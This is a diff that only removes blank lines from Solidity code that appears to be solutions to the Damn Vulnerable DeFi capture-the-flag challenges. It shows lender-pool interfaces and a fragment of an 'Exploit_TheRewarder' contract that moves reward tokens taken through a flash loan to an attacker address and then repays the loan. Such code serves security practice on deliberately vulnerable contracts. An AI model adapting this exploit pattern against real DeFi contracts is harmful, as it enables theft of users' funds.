@@ -110,9 +110,7 @@ pragma solidity ^0.8.0;
 
 interface ISideEntranceLenderPool {
     function deposit() external payable;
-
     function withdraw() external;
-
     function flashLoan(uint256 amount) external;
 }
 
@@ -165,7 +163,6 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 interface ITheRewarderPool {
     function deposit(uint256 amount) external;
-
     function withdraw(uint256 amount) external;
 }
 
@@ -209,7 +206,6 @@ contract Exploit_TheRewarder {
         uint256 stolenReward = rewardToken.balanceOf(address(this));
         require(stolenReward > 0, "Could not steal the funds.");
         rewardToken.transfer(attackerEOA, stolenReward);
-
         //return the flash loan
         liquidityToken.transfer(address(flashLoanPool), amount);
     }
